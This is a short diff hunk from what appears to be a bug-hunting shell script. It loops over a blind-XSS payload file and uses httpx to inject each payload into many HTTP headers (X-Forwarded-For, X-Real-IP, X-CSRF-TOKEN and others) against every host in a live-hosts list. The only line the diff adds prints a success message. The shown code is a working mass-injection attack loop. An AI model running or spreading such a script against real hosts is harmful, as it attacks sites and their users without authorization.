@@ -44,3 +44,5 @@ do  httpx -l $1LIVE.txt  -H "X-Forwarded-for: $bxss" -H "X-forwarded-ip: $bxss" 
 sleep 1
 httpx -l $1LIVE.txt  -H "X-Client-ip: $bxss" -H "X-real-ip: $bxss" -H "X-request-uri: $bxss" \  -H "X-XSRF-TOKEN: $bxss" -H "X-CSRF-TOKEN: $bxss" 
 done < bxss-payload.txt
+
+ echo " BLIND XSS  successfully  " 
